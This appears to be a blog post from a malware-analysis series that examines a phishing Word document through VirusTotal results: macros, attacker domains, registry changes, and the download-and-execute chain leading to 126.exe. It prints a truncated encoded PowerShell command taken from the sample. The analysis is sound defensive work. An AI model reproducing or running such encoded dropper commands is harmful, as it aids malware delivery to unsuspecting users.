<!doctype html><html lang=en><head><meta charset=UTF-8><meta content="IE=edge" http-equiv=X-UA-Compatible><meta content="text/html; charset=UTF-8" http-equiv=content-type><meta content="width=device-width,initial-scale=1,user-scalable=no" name=viewport><meta content="index, follow" name=robots><title>Initial analysis</title><meta content="Initial analysis" name=title><meta content=Falcon name=author><meta content=website property=og:type><meta content=https://0xf4lc0n.github.io/blog/first-steps-in-re/initial-analysis/ property=og:url><meta property=og:site_name><meta content="Initial analysis" property=og:title><meta content=https://0xf4lc0n.github.io/favicon.ico property=og:image><link href=https://0xf4lc0n.github.io/blog/first-steps-in-re/initial-analysis/ rel=canonical><link rel="shortcut icon" href=https://0xf4lc0n.github.io/favicon.ico type=image/x-icon><link href=https://0xf4lc0n.github.io/atom.xml rel=alternate title=RSS type=application/atom+xml><link href=https://0xf4lc0n.github.io/css/style.css rel=stylesheet><script defer src=https://0xf4lc0n.github.io/js/script.js></script><body><div class=wrapper><header><nav class=navBar><a href=/> /home/ </a><a href=/blog> /blog/ </a><a href=/about> /about/ </a><div class=themeSwitch><button class="themeButton dark" onclick="setTheme('dark')" title="Dark mode"><svg class="icons icons__background"><use href=https://0xf4lc0n.github.io/icons.svg#darkMode></use></svg></button><button class="themeButton light" onclick="setTheme('light')" title="Light mode"><svg class="icons icons__background"><use href=https://0xf4lc0n.github.io/icons.svg#lightMode></use></svg></button></div></nav></header><main><h1>Initial analysis</h1><p>The hero of my project was file PL_95054906484_68262954.doc which was attached in phishing mail received by my friend.<p>Because it is Microsoft Office Word file I also installed Microsoft Office on my Windows machine. What is more, based on my knowledge I assumed that I had to deal with Office macro and dropper written in PowerShell.<p>For a good start, I used VirusTotal.<p><img alt src=https://0xf4lc0n.github.io/blog/first-steps-in-re/initial-analysis/img/virustotal_1.png><p>Most of the AV Engines detected threat. By analysing tags I confirmed my previous assumptions. Additionally tags showed the that code could be obfuscated.<p><img alt src=https://0xf4lc0n.github.io/blog/first-steps-in-re/initial-analysis/img/virustotal_2.png><p>In DETAILS I found metadata like author, time of file creation and software which was used for its creation.<p><img alt src=https://0xf4lc0n.github.io/blog/first-steps-in-re/initial-analysis/img/virustotal_7.png><p>But more interesting were information about the OLE objects:<p><img alt src=https://0xf4lc0n.github.io/blog/first-steps-in-re/initial-analysis/img/virustotal_3.png><p><img alt src=https://0xf4lc0n.github.io/blog/first-steps-in-re/initial-analysis/img/virustotal_4.png><p>And macros:<p><img alt src=https://0xf4lc0n.github.io/blog/first-steps-in-re/initial-analysis/img/virustotal_5.png><p><img alt src=https://0xf4lc0n.github.io/blog/first-steps-in-re/initial-analysis/img/virustotal_6.png><p>This also confirmed that the code was obfuscated in order to make analysis harder.<p>In RELATIONS I gained informations about attacker infrastructure.<p>There, I found three domains from which the dropper would probably try to download “proper malware”.<p><img alt src=https://0xf4lc0n.github.io/blog/first-steps-in-re/initial-analysis/img/virustotal_8.png><p>pieceofpassion.net domain was registered by proxy which allow for anonimity.<p><img alt src=https://0xf4lc0n.github.io/blog/first-steps-in-re/initial-analysis/img/virustotal_9.png><p>In BEHAVIOUR I found more specific information about what the malware does.<p>Domain requests:<p><img alt src=https://0xf4lc0n.github.io/blog/first-steps-in-re/initial-analysis/img/virustotal_10.png><p>Register modifications:<p><img alt src=https://0xf4lc0n.github.io/blog/first-steps-in-re/initial-analysis/img/virustotal_11.png><p>Created process:<p><img alt src=https://0xf4lc0n.github.io/blog/first-steps-in-re/initial-analysis/img/virustotal_12.png><p>PowerShell instructions:<p><img alt src=https://0xf4lc0n.github.io/blog/first-steps-in-re/initial-analysis/img/virustotal_13.png><p>This sequence was particularly interesting:<pre class=language-powershell data-lang=powershell style=background:#282828;color:#fdf4c1aa><code class=language-powershell data-lang=powershell><span>    powershell </span><span style=color:#fe8019>-</span><span>enco PAAjACAAaAB0AHQAcABzADoALwAvAHcAdwB3AC4AbQBpAGMAcgBvAHMAbwBmAHQALgBjAG8AbQAvACAAIwA</span><span style=color:#fe8019>+</span><span>ACAAJABSAGUAZgBpAG4AZQBkAF8AUABsAGEAcwB0AGkAYwBfAFMAb…
</span></code></pre><p>That is PowerShell script encoded by Base64.<p>The 126.exe file is also worth noticing. It appeared in process tree. I supposed that it was the resulted file which had created by dropper module.<p>Created process and services:<p><img alt src=https://0xf4lc0n.github.io/blog/first-steps-in-re/initial-analysis/img/virustotal_15.png><p>Used DLL files:<p><img alt src=https://0xf4lc0n.github.io/blog/first-steps-in-re/initial-analysis/img/virustotal_14.png><h3 id=summary>Summary</h3><p>Based on information that I gained from VirusTotal I created small steps list which illustrates what the mysterious doc file could do:<ol><li>After running a doc file in MS Word editor, the macro is processed. (Propably we have to allow macro execution)<li>Macro spawns cmd process which starts encoded PowerShell script.<li>PowerShell script downloads content of malware which is saved in 126.exe file.<li>Then PowerShell script runs 126.exe and creates service sizetablet.exe.</ol><p>But what the file 126.exe and the created service really does? I wasn’t able to affirm that in this stage of analysis but I thought that it could be a ransomware.<h4 id=table-of-content>Table of content:</h4><ol><li><a href=/blog/first-steps-in-re/environment-configuration>Environment configuration</a><li><a href=/blog/first-steps-in-re/initial-analysis>Initial analysis</a><li><a href=/blog/first-steps-in-re/macro-analysis>Macro analysis</a><li><a href=/blog/first-steps-in-re/dropper-analysis>Dropper analysis</a><li><a href=/blog/first-steps-in-re/detonation>Detonation</a><li><a href=/blog/first-steps-in-re/domain-analysis>Domain analysis</a><li><a href=/blog/first-steps-in-re/detonation-v2>Detonation ver. 2</a><li><a href=/blog/first-steps-in-re/summary>Summary</a></ol><p class=tagsData></main><footer><hr><div class=footContainer><div class=footLeft><p>Licensed under <a rel="noopener noreferrer" href=https://fr.wikipedia.org/wiki/Licence_MIT target=_blank>MIT</a><br> Built with <a rel="noopener noreferrer" href=https://www.getzola.org target=_blank>Zola</a> using <a rel="noopener noreferrer" href=https://github.com/Speyll/anemone target=_blank>anemone</a> theme & <a rel="noopener noreferrer" href=https://github.com/Speyll/veqev target=_blank>veqev</a> colors.<br></div><div class=footRight><a rel="noopener noreferrer" title="Subscribe via RSS for updates." class=icons__background href=https://0xf4lc0n.github.io/atom.xml target=_blank><svg class="icons icons__background"><use href=https://0xf4lc0n.github.io/icons.svg#rss></use></svg></a></div></div></footer></div>